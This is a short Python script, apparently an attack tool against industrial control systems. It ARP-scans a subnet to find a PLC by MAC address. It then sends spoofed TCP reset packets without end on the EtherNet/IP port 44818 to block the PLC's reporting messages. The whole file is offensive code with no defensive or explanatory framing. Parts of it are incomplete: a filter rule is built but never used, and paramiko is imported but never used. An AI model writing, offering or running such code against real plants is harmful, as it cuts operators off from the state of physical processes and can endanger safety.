from scapy.all import ARP, Ether, srp, IP, TCP, send
import paramiko
import time

def find_plc_ip(target_mac, network_range):
    # Create an ARP request packet
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find the PLC's IP address
    for sent, received in result:
        if received.hwsrc.lower() == target_mac.lower():
            return received.psrc

    return None

def block_reporting_messages(plc_ip, interface):
    # Create a filter to block reporting messages (assuming they use TCP)
    filter_rule = f"tcp and src host {plc_ip}"

    # Continuously send RST packets to block the communication
    while True:
        # Craft a TCP RST packet
        packet = IP(src=plc_ip)/TCP(sport=44818, dport=44818, flags="R")
        send(packet, iface=interface, verbose=0)
        time.sleep(0.1)  # Adjust the sleep time as needed

if __name__ == "__main__":
    # Define the MAC address of the PLC and the network range
    plc_mac = "00:1D:9C:C7:B0:08"  # Replace with the actual MAC address of the PLC
    network_range = "192.168.1.0/24"  # Replace with the actual network range

    # Define the network interface to use
    interface = "eth0"  # Replace with the actual network interface

    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip(plc_mac, network_range)
    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")
    else:
        print("PLC not found on the network.")
        exit(1)

    # Step 2: Block reporting messages
    try:
        print(f"Blocking reporting messages from {plc_ip}...")
        block_reporting_messages(plc_ip, interface)
    except KeyboardInterrupt:
        print("Blocking stopped.")